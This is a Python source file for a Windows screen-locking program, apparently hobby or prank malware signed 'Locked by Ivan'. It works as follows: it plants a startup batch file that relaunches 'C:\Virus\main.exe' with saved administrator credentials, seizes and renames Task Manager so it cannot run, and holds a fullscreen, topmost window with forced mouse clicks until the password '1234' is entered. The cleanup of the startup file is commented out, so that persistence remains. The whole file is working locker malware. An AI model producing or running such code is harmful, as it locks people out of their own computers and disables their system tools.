from tkinter import Tk, Entry, Label
from pyautogui import click, moveTo
from time import sleep
import pyautogui
import os
import getpass


USER_NAME = getpass.getuser()


def callback(event):
    global k, entry, end_realy
    if entry.get() == "1234":
        k = True
        end_realy = True


def on_closing():
    click(width/2, height/2)
    moveTo(width/2, height/2)
    root.attributes("-fullscreen", True)
    root.protocol("WM_DELETE_WINDOW", on_closing)
    root.update()
    root.bind('<Return>', callback)
bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\open.bat' % USER_NAME
file_path = 'C:\Virus' + '\main.exe'
a = 1
try:
    with open(bat_path, "r") as bat_file:
        pass
except FileNotFoundError:
    with open(bat_path, "w") as bat_file:
        bat_file.write('chcp 1251\n')
        bat_file.write(r'runas /savecred /user:Администратор "%s"' % file_path)
    try:
        path1 = r"C:\Windows\System32\Taskmgr.exe"
        path2 = r"C:\Windows\System32\Taskmger.exe"
        os.system("takeown /f C:\Windows\System32\Taskmgr.exe")  
        os.system("icacls C:\Windows\System32\Taskmgr.exe /grant Администраторы:F /c /l") 
        os.system("icacls C:\Windows\System32\Taskmgr.exe /grant Пользователи:F /c /l") # убиваем диспетчер задач если он запущен

        os.system("taskkill /im taskmgr.exe") # убиваем диспетчер задач если он запущен
        os.rename(path1, path2)#перименовываем файл чтобы система не могла его найти
        a = 2
    except PermissionError:
        a = 1
    except FileNotFoundError:
        a = 2
root = Tk()
pyautogui.FAILSAFE = False
width = root.winfo_screenwidth()
height = root.winfo_screenheight()
root.title('Locked')
root.attributes("-fullscreen", True)
root.attributes("-topmost", True)
entry = Entry(root, font=1)
entry.place(width=150, height=50, x=width/2-75, y=height/2-25)
label0 = Label(root, text=f"Locked by Ivan:))", font=1)
label0.grid(row=0, column=0)
label1 = Label(root, text="Пиши пароль и жми Enter", font='Arial 20')
label1.place(x=width/2-75-130, y=height/2-25-100)
root.update()
sleep(0.2)
click(width/2, height/2)
k = False
end_realy = False
while not k:
    on_closing()
# if end_realy:
#     os.remove(bat_path)
if a == 2:
    os.rename(path2, path1)
